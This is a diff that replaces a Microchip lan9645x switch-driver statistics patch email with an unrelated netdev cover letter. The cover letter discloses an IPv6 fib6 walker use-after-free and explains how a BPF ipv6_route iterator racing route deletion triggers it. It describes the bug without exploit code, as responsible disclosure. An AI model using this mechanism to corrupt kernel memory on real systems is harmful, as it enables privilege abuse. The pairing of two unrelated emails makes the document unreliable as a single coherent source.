@@ -1,1450 +1,813 @@
-Received: from esa.microchip.iphmx.com (esa.microchip.iphmx.com [68.232.153.233])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1EDC33ACA59;
-	Tue,  8 Sep 2026 07:41:49 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=68.232.153.233
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 194D839CD10
+	for <netdev@vger.kernel.org>; Tue,  8 Sep 2026 07:43:06 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788853313; cv=none; b=GI0VejQUPIUFiS+5QmEj9lhmMOurnG4zo0uA2EuMww4rpNrY2UoSvze9rASQrwznidsc/z3djYAMvJhraEXBKGUzmd+GlzeLryvQ//vJWYycpUtr9F+KK7prSTmAPV+rBDRUNvh5Tmtc5tg3kbLJRGWsNX9guepTXMWC9k840+c=
+	t=1788853389; cv=none; b=aY9itMJFrKsQHPnqhsfXbfsYyz0GsponkSOZxXJC68AGo/caMaRGTWYDx1VtjndeVxunIuA9d1DLuP1OLh+uQ+T01EnqLsSlqb5Pujk1RdHqvyd8fYrptzq73xqnvLEcKzSBiHQtHe/zs14ia+j5DB0qdqY/TdZUMig7I0cOxts=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788853313; c=relaxed/simple;
-	bh=PLRyXX3OIZ3EigBYoJ1c6lTQdZFUPz8kxNcyaBReBsk=;
-	h=From:Date:Subject:MIME-Version:Content-Type:Message-ID:References:
-	 In-Reply-To:To:CC; b=pRVGf8dv1W+W4mEWwfkcUz7EdvnD0nTPl8TbjyN0abR3X4ZL758CbqYyZxC5yeWJZ6jhphJuNg+wNGPpAAB4ZVgKsqrEgJK8c1UZUKeyVtsx456nOkOZEPx1xtLrvEdyHJavNHqzdoVuWM3Lrzkj5n6KtWRY0owXzzLGX/xa9uc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=microchip.com; spf=pass smtp.mailfrom=microchip.com; dkim=pass (2048-bit key) header.d=microchip.com header.i=@microchip.com header.b=1oTjjyF3; arc=none smtp.client-ip=68.232.153.233
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=microchip.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=microchip.com
+	s=arc-20240116; t=1788853389; c=relaxed/simple;
+	bh=MfrtyoRng5AElGMK+lb28ltWREnwPrCIfDxkA5+swhk=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qy9JpVxfPyB8VOuT7LnRhXiaqoF0r6poJ8wLEUSD75+eXK6bD0yZIciKEaZqccdSVbb5eYHtQ5UJFmDuFwi6WTxR82c8bzmEQrBr4p0ftWOkOD0WmYUsvDUN0X2jQ6qBEVQ3FRmtY//a7kYXfOZbApTjuDkXpHG6NzXbVuoy7SM=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Z8bXfMlT; arc=none smtp.client-ip=209.85.210.174
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=microchip.com header.i=@microchip.com header.b="1oTjjyF3"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=microchip.com; i=@microchip.com; q=dns/txt; s=mchp;
-  t=1788853310; x=1820389310;
-  h=from:date:subject:mime-version:content-transfer-encoding:
-   message-id:references:in-reply-to:to:cc;
-  bh=PLRyXX3OIZ3EigBYoJ1c6lTQdZFUPz8kxNcyaBReBsk=;
-  b=1oTjjyF3P9BlKLYMCsbZAMZx6rtoNIZ9uTEqYsIeB2tWrQUTxA3kboAP
-   hzAoSbygaN+hbNayGJU/aVigxkfwrGK0XfpYYq+x0p/fR8lAacbUKjs4M
-   FhwRYLMDZlWCS5nwWt6jP5EeW9TSsd5dQVXo7Xb9FQAS8Jx/rpIOpWC8r
-   dnCMFEsS/MqDA27jUxYTmLHxxYAFoBQ6WzyD/kYHnlXw4oFz/3uQG8kwn
-   UGaH5kOT8QHOgnrzM7HibGdqIo5w7ZNDSFPB62gi11O1lAIhCBnecJRss
-   7eQwIVFbYIsmNwYufqPOZmAlyyc5FRXdF4D2whDvPh/Kx64YpNInb0EL8
-   g==;
-X-CSE-ConnectionGUID: JahPM132TXSbzkfMt0EX+w==
-X-CSE-MsgGUID: YjyJot7NQGSc2+7w1jLN9A==
-X-IronPort-AV: E=Sophos;i="6.25,268,1779174000"; 
-   d="scan'208";a="73216595"
-X-Amp-Result: SKIPPED(no attachment in message)
-Received: from unknown (HELO email.microchip.com) ([170.129.1.10])
-  by esa1.microchip.iphmx.com with ESMTP/TLS/ECDHE-RSA-AES128-GCM-SHA256; 08 Sep 2026 00:41:48 -0700
-Received: from chn-vm-ex04.mchp-main.com (10.10.85.152) by
- chn-vm-ex02.mchp-main.com (10.10.85.144) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
- 15.1.2507.58; Tue, 8 Sep 2026 00:41:48 -0700
-Received: from [127.0.0.1] (10.10.85.11) by chn-vm-ex04.mchp-main.com
- (10.10.85.152) with Microsoft SMTP Server id 15.1.2507.58 via Frontend
- Transport; Tue, 8 Sep 2026 00:41:44 -0700
-From: =?utf-8?q?Jens_Emil_Schulz_=C3=98stergaard?=
-	<jensemil.schulzostergaard@microchip.com>
-Date: Tue, 8 Sep 2026 09:39:51 +0200
-Subject: [PATCH net-next v12 9/9] net: dsa: lan9645x: add port statistics
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Z8bXfMlT"
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-86309e1a213so812246b3a.0
+        for <netdev@vger.kernel.org>; Tue, 08 Sep 2026 00:43:06 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788853386; x=1789458186; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=w4XcF1eFNV64NWA8E1+wrl7IuCm5sqmoW0RkkcAVpaw=;
+        b=Z8bXfMlTzuBeBAgFwbXSoLqybchmjUCah2B3EL3v/xituDbr+v1ZtpH+DS4aN/Pn4f
+         aBBsb0rwVmR40xonI+LwKFDq3DhdoAuYU/jbyyGpDh3uYcMIUhDIDUMMZ+a4dxTLqRLJ
+         UmqBfx1LPskPjNLQyyJfa8chuvTAwCL0cR4Mj5IOG6ZTLrRKIJji/80cACIxKqIGCaXn
+         7c4GTUU3xFfeylG7n9aH2Sh+8LcipQrK1q3xzan+i8koeoI6BkZUVKBf/iKtKhZmW2hj
+         b2qG3DDLPkoEeDXjMKB3NtF0Uu0shvgZL+5PXJUrAPNnGWWGhAssTRaKtYiXyYCZnfLz
+         f78g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788853386; x=1789458186;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=w4XcF1eFNV64NWA8E1+wrl7IuCm5sqmoW0RkkcAVpaw=;
+        b=A1l0vTe+FQkH4rDQYv6B08M/STa/Q/nQIxd31YlwJpviLxh8W7VBYJ7KiKTRRbGGuJ
+         jWOhMQuL6iSawqzJv1DkM5eRc/hd8BAOKhEmF1b5ReF054aYrcgmD5qHLRXzVQbxNYy/
+         afLrv+QPZnNU6QnyefkhdEVpMWR5DTDg4FloT81/1m+nyYaTth57Q8vaPW9V5R8kK7l2
+         siXurrNAoHyxoQarr193KJqVwKULD22Sgj4fcLkT+XPhgbMEBm2eGe4xyVhxWu3yIEud
+         MO2Zrz1HYHdD3XJrSAy8RkLweZxJyKSG+UyXbsB6s2AWREy3Z6UHi7ufLpp9SyCO/Nhz
+         XL9w==
+X-Forwarded-Encrypted: i=1; AKwUvBwoI99b2Vk1IwsEdXFH4KcI+xUoMF2N94pOH5mLTFvCRRVBTDJ7uqMs1VWf7emFikgyS5GaA9A=@vger.kernel.org
+X-Gm-Message-State: AFuF++k6j3UbLjThw8IssWTSDMCe/Mcn4BKZuK7hmCo10vQbY4ErDztg
+	uGymI+vBTBUMx5dsJwffmgoiMJbGMOzAyaxo09A1izrBrL3qLvFB9mDILPqN2OWQiwNFw6pWvwz
+	NPd6nUIb5
+X-Gm-Gg: AYBFou3pdiTdLjfWzPqIKDDwo9x+B4foJmzAJs9cuaqw1f8ncar1RRzxauBawlxovzh
+	Mernbj7W0wIU75c0Kl6dR/G8y+J9/D3Ui2QcKYQnoObLABDEL+xfj4LxletQvwup7/GrWzFLZX4
+	kn9vOWtRf5BC665pm5voeLj16NUAFQE8+82A13OAy+OUVqT6TYwyfn6VBi4wA/vP+CMseYP3RU4
+	+DPAKQdZpKFQ7CF0KK8vriIu2bFEF9qAPnyV5yP2GGfkpOcBR5nBNURC1dy6a1u792nXGRksGl5
+	IP6prajm3WBClYWLl4QM95miwRxcl/sKIpxhH7x33uHIQLqUEGNTgljxkR1RdBFCtKDcyaMU54M
+	QTIxqupeqrXbSu5O68Uf/+rEJhwpBG28+HGfewmex0U06pqoEC4KteF7bM9OMxxJCyqvjBzr9aJ
+	y5xr/H2dSSxSRY1WLMHv0lEvqQ9oUoHOp0bKrgB2Tb6Y0VHGSJhQRu9xBsjR69mYtIsXsBmF8OX
+	Z7TcCYfHUGti+I0rTI=
+X-Received: by 2002:a05:6a00:929e:b0:857:7317:cff6 with SMTP id d2e1a72fcca58-8616aa630a5mr38098632b3a.23.1788853385001;
+        Tue, 08 Sep 2026 00:43:05 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8633cc0f7e2sm3499943b3a.37.2026.09.08.00.43.01
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 08 Sep 2026 00:43:04 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: David Ahern <dsahern@kernel.org>,
+	Ido Schimmel <idosch@nvidia.com>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	netdev@vger.kernel.org
+Cc: Zihan Xi <zihanx@nebusec.ai>,
+	Simon Horman <horms@kernel.org>,
+	Hannes Frederic Sowa <hannes@stressinduktion.org>,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH net 0/1] ipv6: fix fib6 walker UAF on seq stop
+Date: Tue,  8 Sep 2026 07:42:55 +0000
+Message-ID: <cover.1788837093.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 8bit
-Message-ID: <20260908-dsa_lan9645x_switch_driver_base-v12-9-2d6aa59350cd@microchip.com>
-References: <20260908-dsa_lan9645x_switch_driver_base-v12-0-2d6aa59350cd@microchip.com>
-In-Reply-To: <20260908-dsa_lan9645x_switch_driver_base-v12-0-2d6aa59350cd@microchip.com>
-To: <UNGLinuxDriver@microchip.com>, Andrew Lunn <andrew@lunn.ch>, "Vladimir
- Oltean" <olteanv@gmail.com>, "David S. Miller" <davem@davemloft.net>, "Eric
- Dumazet" <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni
-	<pabeni@redhat.com>, Simon Horman <horms@kernel.org>, Rob Herring
-	<robh@kernel.org>, Krzysztof Kozlowski <krzk+dt@kernel.org>, Conor Dooley
-	<conor+dt@kernel.org>, Woojung Huh <woojung.huh@microchip.com>, Russell King
-	<linux@armlinux.org.uk>, Steen Hegelund <Steen.Hegelund@microchip.com>,
-	Daniel Machon <daniel.machon@microchip.com>, Geert Uytterhoeven
-	<geert+renesas@glider.be>, Magnus Damm <magnus.damm@gmail.com>
-CC: <linux-kernel@vger.kernel.org>, <netdev@vger.kernel.org>,
-	<devicetree@vger.kernel.org>, <linux-renesas-soc@vger.kernel.org>,
-	=?utf-8?q?Jens_Emil_Schulz_=C3=98stergaard?=
-	<jensemil.schulzostergaard@microchip.com>
-X-Mailer: b4 0.15-dev
 
-Add statistics support for the port counters. Chip registers are 32 bit,
-so this unit is responsible maintaining a 64bit software cache, and
-updating it frequently to handle overflows in hardware.
+Hi Linux kernel maintainers,
 
-The eMAC and pMAC counter sources are decoded, but only the aggregate
-source is reachable for now, until MAC merge support is added.
+We found and validated a issue in net/ipv6/ip6_fib.c. We reproduced
+it as root using a BPF ipv6_route iterator racing RTM_DELROUTE.
+We've tested it, and it should not affect any other functionality.
 
-Reviewed-by: Steen Hegelund <Steen.Hegelund@microchip.com>
-Signed-off-by: Jens Emil Schulz Østergaard <jensemil.schulzostergaard@microchip.com>
----
-Changes in v12:
-- Clear hardware and software counters lan9645x_stats_init().
-- get_stats64: add the missing SCNT_RX_PMAC_LONG to rx_packets.
-- get_stats64: move SCNT_DR_TAIL from rx_dropped to rx_missed_errors.
-- Drop the unimplemented ISDX, ESDX and SFID counter views, the MAC
-  merge statistics, and the now unused view back pointer, type and name
-  fields.
-- Rename lan9645x_stats_add_cnt() to lan9645x_stats_update_counter().
-- Move lan9645x_get_vstats() out of lan9645x_stats.h and into
-  lan9645x_stats.c, and replace the STATS_INDEX and STAT_COUNTERS macros
-  with static functions there.
-- Drop the NULL return from lan9645x_get_vstats(), and the three guards it
-  forced on its callers.
-- Drop the unreachable mac merge related code.
-- get_eth_mac_stats: leave InRangeLengthErrors and OutOfRangeLengthField
-  unset. Both describe the 802.3 length/type field, which the MAC does not
-  validate.
-- get_eth_mac_stats: leave SingleCollisionFrames unset. SCNT_TX_COL
-  counts collision events, charging 16 to a frame that hits the excessive
-  collision limit, so it cannot express the attribute. It is still
-  reported as rtnl_link_stats64.collisions.
-- get_eth_mac_stats: add SCNT_RX_JABBER to FrameTooLongErrors, the
-  too-long-with-bad-CRC half of the event.
-- get_stats64: drop SCNT_RX_SYMBOL_ERR from rx_errors, it is a subset of
-  SCNT_RX_CRC which rx_crc_errors already covers. Still reported as
-  SymbolErrorDuringCarrier.
-- get_stats64: report rx_length_errors and rx_crc_errors.
-  rx_length_errors carries the FrameTooLongErrors counters, and runts
-  are left out of it since they have no 802.3 length attribute.
-  SCNT_RX_SHORT is reported in rx_errors and rmon undersize_pkts
-  instead.
-- Size the bulk read scratch buffer for a single index rather than all of
-  them. hw_lock is held across the read and the transfer into the 64 bit
-  counters, so only one index is ever live.
-- Stop the statistics poller in .shutdown. dsa_switch_shutdown() does not
-  call .teardown, so the delayed work stays armed and keeps reading
-  registers after the parent holding the regmaps has been shut down.
-- Drop dr_tail from the ethtool -S list. It is reported as
-  rtnl_link_stats64.rx_missed_errors.
-- lan9645x_teardown(): stop the counter poller first, so nothing reads
-  registers while the rest unwinds.
-- Stop using SCNT_RX_FRAG. It counts frames received after the port is
-  paused rather than undersize frames, so it is dropped from rx_errors,
-  rx_packets and the rmon fragment count.
-- get_stats64: drop SCNT_RX_CAT_DROP and SCNT_RX_LONG from rx_dropped.
-  Classifier drops cover ordinary ingress filtering, and an oversized
-  frame is an error rather than a drop, so it is reported in rx_errors
-  and rx_length_errors.
-- lan9645x_stats.h: include what it uses, and spell the ethtool statistics
-  argument u64, matching the definition.
-- Rate limit the bulk read error. It sits under the three second poller and
-  runs once per port.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Changes in v11:
-- add comment about calling contexts of sw_lock in
-  lan9645x_stats_get_stats64
+---- details below ----
 
-Changes in v5:
-- make lan9645x_stats_init void
-- add SCNT_TX_BUFDROP to tx_dropped
-- change rmon range {0,64} -> {64, 64}. Runt frames counted elsewhere.
-- remove rx_crc, rx_symbol_err from rx_packets, as they are already
-  counted in SZ_* buckets.
-- add defensive cancel_delayed_work_sync in stats_free
+Bug details:
 
-Changes in v4:
-- remove rx_uc and tx_uc from ethtool stats list, as they are derivable
-  from the eth-mac group
-- split stats_init into stats_alloc and stats_init, use alloc in probe
-  and init in dsa_setup
+ipv6_route_iter_active() treats a fib6 walker in FWS_U at the table
+root as already unlinked from net->ipv6.fib6_walkers. That heuristic
+is wrong when the last route at a table root is deleted:
+fib6_del_route() moves a still-linked walker into FWS_U without
+unlinking it.
 
-Changes in v3:
-- No changes
+ipv6_route_native_seq_stop() therefore skips fib6_walker_unlink().
+The seq private object can then be reset or freed while it remains on
+the walker list. A later route deletion or tree repair walks the
+dangling list and reads or writes the freed walker.
 
-Changes in v2:
-- introduce spinlock sw_lock protecting software counters and region
-  buffer.
-- ran Ioana's selftest for standard counters
-        drivers/net/hw/ethtool_std_stats.sh
-  along with
-        selftests/drivers/net/hw/ethtool_rmon.sh
-  they pass except for software injected pause frames.
-- remove strings/counters covered by standard counters from
-  get_strings/get_ethtool_stats.
-- fix proper use of 'src' in standard counters
-- remove static region table, and use stats_prepare_regions for dynamic
-  region calculation inspired by ocelot.
-- fix queue leak in error path.
----
- drivers/net/dsa/microchip/lan9645x/Makefile        |   1 +
- drivers/net/dsa/microchip/lan9645x/lan9645x_main.c |  82 +-
- drivers/net/dsa/microchip/lan9645x/lan9645x_main.h |   3 +
- .../net/dsa/microchip/lan9645x/lan9645x_stats.c    | 856 +++++++++++++++++++++
- .../net/dsa/microchip/lan9645x/lan9645x_stats.h    | 229 ++++++
- 5 files changed, 1170 insertions(+), 1 deletion(-)
+The same stop helper is used by /proc/net/ipv6_route and by the BPF
+ipv6_route iterator. The BPF show program can keep seq_show() in the
+FWS_C / leaf window long enough for the delete to land, which makes
+the race practical. /proc/net/ipv6_route has the same membership bug
+with a narrower window.
 
-diff --git a/drivers/net/dsa/microchip/lan9645x/Makefile b/drivers/net/dsa/microchip/lan9645x/Makefile
-index 2413d11fe849..cd994943c1c0 100644
---- a/drivers/net/dsa/microchip/lan9645x/Makefile
-+++ b/drivers/net/dsa/microchip/lan9645x/Makefile
-@@ -8,4 +8,5 @@ mchp-lan9645x-objs := \
- 	lan9645x_npi.o \
- 	lan9645x_phylink.o \
- 	lan9645x_port.o \
-+	lan9645x_stats.o \
- 	lan9645x_vlan.o \
-diff --git a/drivers/net/dsa/microchip/lan9645x/lan9645x_main.c b/drivers/net/dsa/microchip/lan9645x/lan9645x_main.c
-index e41a73c20606..599099c72968 100644
---- a/drivers/net/dsa/microchip/lan9645x/lan9645x_main.c
-+++ b/drivers/net/dsa/microchip/lan9645x/lan9645x_main.c
-@@ -5,6 +5,7 @@
- #include <linux/platform_device.h>
- 
- #include "lan9645x_main.h"
-+#include "lan9645x_stats.h"
- 
- static const char *lan9645x_resource_names[NUM_TARGETS] = {
- 	[TARGET_GCB]          = "gcb",
-@@ -74,6 +75,7 @@ static void lan9645x_teardown(struct dsa_switch *ds)
- {
- 	struct lan9645x *lan9645x = ds->priv;
- 
-+	lan9645x_stats_deinit(lan9645x);
- 	lan9645x_mdb_deinit(lan9645x);
- 	lan9645x_mac_deinit(lan9645x);
- 	mutex_destroy(&lan9645x->fwd_domain_lock);
-@@ -297,6 +299,8 @@ static int lan9645x_setup(struct dsa_switch *ds)
- 	lan_wr(BIT(lan9645x->num_phys_ports) | front_ports, lan9645x,
- 	       ANA_PGID(PGID_BC));
- 
-+	lan9645x_stats_init(lan9645x);
-+
- 	ds->mtu_enforcement_ingress = true;
- 	ds->assisted_learning_on_cpu_port = true;
- 	ds->fdb_isolation = true;
-@@ -767,6 +771,62 @@ static int lan9645x_port_mdb_del(struct dsa_switch *ds, int port,
- 	return err;
- }
- 
-+static void lan9645x_get_strings(struct dsa_switch *ds, int port, u32 stringset,
-+				 uint8_t *data)
-+{
-+	lan9645x_stats_get_strings(ds->priv, port, stringset, data);
-+}
-+
-+static void lan9645x_get_ethtool_stats(struct dsa_switch *ds, int port,
-+				       uint64_t *data)
-+{
-+	lan9645x_stats_get_ethtool_stats(ds->priv, port, data);
-+}
-+
-+static int lan9645x_get_sset_count(struct dsa_switch *ds, int port, int sset)
-+{
-+	return lan9645x_stats_get_sset_count(ds->priv, port, sset);
-+}
-+
-+static void lan9645x_get_eth_mac_stats(struct dsa_switch *ds, int port,
-+				       struct ethtool_eth_mac_stats *mac_stats)
-+{
-+	lan9645x_stats_get_eth_mac_stats(ds->priv, port, mac_stats);
-+}
-+
-+static void
-+lan9645x_get_rmon_stats(struct dsa_switch *ds, int port,
-+			struct ethtool_rmon_stats *rmon_stats,
-+			const struct ethtool_rmon_hist_range **ranges)
-+{
-+	lan9645x_stats_get_rmon_stats(ds->priv, port, rmon_stats, ranges);
-+}
-+
-+static void lan9645x_get_stats64(struct dsa_switch *ds, int port,
-+				 struct rtnl_link_stats64 *s)
-+{
-+	lan9645x_stats_get_stats64(ds->priv, port, s);
-+}
-+
-+static void lan9645x_get_pause_stats(struct dsa_switch *ds, int port,
-+				     struct ethtool_pause_stats *pause_stats)
-+{
-+	lan9645x_stats_get_pause_stats(ds->priv, port, pause_stats);
-+}
-+
-+static void lan9645x_get_eth_phy_stats(struct dsa_switch *ds, int port,
-+				       struct ethtool_eth_phy_stats *phy_stats)
-+{
-+	lan9645x_stats_get_eth_phy_stats(ds->priv, port, phy_stats);
-+}
-+
-+static void
-+lan9645x_get_eth_ctrl_stats(struct dsa_switch *ds, int port,
-+			    struct ethtool_eth_ctrl_stats *ctrl_stats)
-+{
-+	lan9645x_stats_get_eth_ctrl_stats(ds->priv, port, ctrl_stats);
-+}
-+
- static const struct dsa_switch_ops lan9645x_switch_ops = {
- 	.get_tag_protocol		= lan9645x_get_tag_protocol,
- 
-@@ -804,6 +864,17 @@ static const struct dsa_switch_ops lan9645x_switch_ops = {
- 	/* Multicast database */
- 	.port_mdb_add			= lan9645x_port_mdb_add,
- 	.port_mdb_del			= lan9645x_port_mdb_del,
-+
-+	/* Port statistics counters. */
-+	.get_strings			= lan9645x_get_strings,
-+	.get_ethtool_stats		= lan9645x_get_ethtool_stats,
-+	.get_sset_count			= lan9645x_get_sset_count,
-+	.get_eth_mac_stats		= lan9645x_get_eth_mac_stats,
-+	.get_rmon_stats			= lan9645x_get_rmon_stats,
-+	.get_stats64			= lan9645x_get_stats64,
-+	.get_pause_stats		= lan9645x_get_pause_stats,
-+	.get_eth_phy_stats		= lan9645x_get_eth_phy_stats,
-+	.get_eth_ctrl_stats		= lan9645x_get_eth_ctrl_stats,
- };
- 
- static int lan9645x_request_target_regmaps(struct lan9645x *lan9645x)
-@@ -898,9 +969,15 @@ static int lan9645x_probe(struct platform_device *pdev)
- 
- 	lan9645x_set_feat_dis(lan9645x);
- 
--	err = dsa_register_switch(ds);
-+	err = lan9645x_stats_alloc(lan9645x);
- 	if (err)
-+		return dev_err_probe(dev, err, "Failed to allocate stats\n");
-+
-+	err = dsa_register_switch(ds);
-+	if (err) {
-+		lan9645x_stats_free(lan9645x);
- 		return dev_err_probe(dev, err, "Failed to register DSA switch\n");
-+	}
- 
- 	return 0;
- }
-@@ -914,6 +991,7 @@ static void lan9645x_remove(struct platform_device *pdev)
- 
- 	/* Calls lan9645x DSA .teardown */
- 	dsa_unregister_switch(lan9645x->ds);
-+	lan9645x_stats_free(lan9645x);
- 	dev_set_drvdata(&pdev->dev, NULL);
- }
- 
-@@ -924,6 +1002,8 @@ static void lan9645x_shutdown(struct platform_device *pdev)
- 	if (!lan9645x)
- 		return;
- 
-+	lan9645x_stats_deinit(lan9645x);
-+
- 	dsa_switch_shutdown(lan9645x->ds);
- 
- 	dev_set_drvdata(&pdev->dev, NULL);
-diff --git a/drivers/net/dsa/microchip/lan9645x/lan9645x_main.h b/drivers/net/dsa/microchip/lan9645x/lan9645x_main.h
-index 66fefd060fd8..1044cb0f5682 100644
---- a/drivers/net/dsa/microchip/lan9645x/lan9645x_main.h
-+++ b/drivers/net/dsa/microchip/lan9645x/lan9645x_main.h
-@@ -219,6 +219,9 @@ struct lan9645x {
- 	 */
- 	struct mutex mdb_lock;
- 
-+	/* Statistics  */
-+	struct lan9645x_stats *stats;
-+
- 	int num_port_dis;
- 
- 	/* VLAN entries */
-diff --git a/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.c b/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.c
-new file mode 100644
-index 000000000000..1253f7748993
---- /dev/null
-+++ b/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.c
-@@ -0,0 +1,856 @@
-+// SPDX-License-Identifier: GPL-2.0+
-+/* Copyright (C) 2026 Microchip Technology Inc.
-+ */
-+
-+#include <linux/spinlock.h>
-+#include <linux/workqueue.h>
-+
-+#include "lan9645x_main.h"
-+#include "lan9645x_stats.h"
-+
-+#define LAN9645X_STATS_CHECK_DELAY	(3 * HZ)
-+
-+/* SYS_STAT_CFG.STAT_CLEAR_SHOT group bits selecting the counter groups that
-+ * are indexed by port: 0 (Rx), 1 (Tx) and 2 (Drop).
-+ * Bit 0: RX
-+ * Bit 1: TX
-+ * Bit 2: Drop
-+ */
-+#define LAN9645X_STAT_PORT_GROUPS	GENMASK(2, 0)
-+
-+static const u32 lan9645x_port_stats_layout[] = {
-+	[SCNT_RX_OCT]              = 0x0,
-+	[SCNT_RX_UC]               = 0x1,
-+	[SCNT_RX_MC]               = 0x2,
-+	[SCNT_RX_BC]               = 0x3,
-+	[SCNT_RX_SHORT]            = 0x4,
-+	[SCNT_RX_FRAG]             = 0x5,
-+	[SCNT_RX_JABBER]           = 0x6,
-+	[SCNT_RX_CRC]              = 0x7,
-+	[SCNT_RX_SYMBOL_ERR]       = 0x8,
-+	[SCNT_RX_SZ_64]            = 0x9,
-+	[SCNT_RX_SZ_65_127]        = 0xa,
-+	[SCNT_RX_SZ_128_255]       = 0xb,
-+	[SCNT_RX_SZ_256_511]       = 0xc,
-+	[SCNT_RX_SZ_512_1023]      = 0xd,
-+	[SCNT_RX_SZ_1024_1526]     = 0xe,
-+	[SCNT_RX_SZ_JUMBO]         = 0xf,
-+	[SCNT_RX_PAUSE]            = 0x10,
-+	[SCNT_RX_CONTROL]          = 0x11,
-+	[SCNT_RX_LONG]             = 0x12,
-+	[SCNT_RX_CAT_DROP]         = 0x13,
-+	[SCNT_RX_RED_PRIO_0]       = 0x14,
-+	[SCNT_RX_RED_PRIO_1]       = 0x15,
-+	[SCNT_RX_RED_PRIO_2]       = 0x16,
-+	[SCNT_RX_RED_PRIO_3]       = 0x17,
-+	[SCNT_RX_RED_PRIO_4]       = 0x18,
-+	[SCNT_RX_RED_PRIO_5]       = 0x19,
-+	[SCNT_RX_RED_PRIO_6]       = 0x1a,
-+	[SCNT_RX_RED_PRIO_7]       = 0x1b,
-+	[SCNT_RX_YELLOW_PRIO_0]    = 0x1c,
-+	[SCNT_RX_YELLOW_PRIO_1]    = 0x1d,
-+	[SCNT_RX_YELLOW_PRIO_2]    = 0x1e,
-+	[SCNT_RX_YELLOW_PRIO_3]    = 0x1f,
-+	[SCNT_RX_YELLOW_PRIO_4]    = 0x20,
-+	[SCNT_RX_YELLOW_PRIO_5]    = 0x21,
-+	[SCNT_RX_YELLOW_PRIO_6]    = 0x22,
-+	[SCNT_RX_YELLOW_PRIO_7]    = 0x23,
-+	[SCNT_RX_GREEN_PRIO_0]     = 0x24,
-+	[SCNT_RX_GREEN_PRIO_1]     = 0x25,
-+	[SCNT_RX_GREEN_PRIO_2]     = 0x26,
-+	[SCNT_RX_GREEN_PRIO_3]     = 0x27,
-+	[SCNT_RX_GREEN_PRIO_4]     = 0x28,
-+	[SCNT_RX_GREEN_PRIO_5]     = 0x29,
-+	[SCNT_RX_GREEN_PRIO_6]     = 0x2a,
-+	[SCNT_RX_GREEN_PRIO_7]     = 0x2b,
-+	[SCNT_RX_ASSEMBLY_ERR]     = 0x2c,
-+	[SCNT_RX_SMD_ERR]          = 0x2d,
-+	[SCNT_RX_ASSEMBLY_OK]      = 0x2e,
-+	[SCNT_RX_MERGE_FRAG]       = 0x2f,
-+	[SCNT_RX_PMAC_OCT]         = 0x30,
-+	[SCNT_RX_PMAC_UC]          = 0x31,
-+	[SCNT_RX_PMAC_MC]          = 0x32,
-+	[SCNT_RX_PMAC_BC]          = 0x33,
-+	[SCNT_RX_PMAC_SHORT]       = 0x34,
-+	[SCNT_RX_PMAC_FRAG]        = 0x35,
-+	[SCNT_RX_PMAC_JABBER]      = 0x36,
-+	[SCNT_RX_PMAC_CRC]         = 0x37,
-+	[SCNT_RX_PMAC_SYMBOL_ERR]  = 0x38,
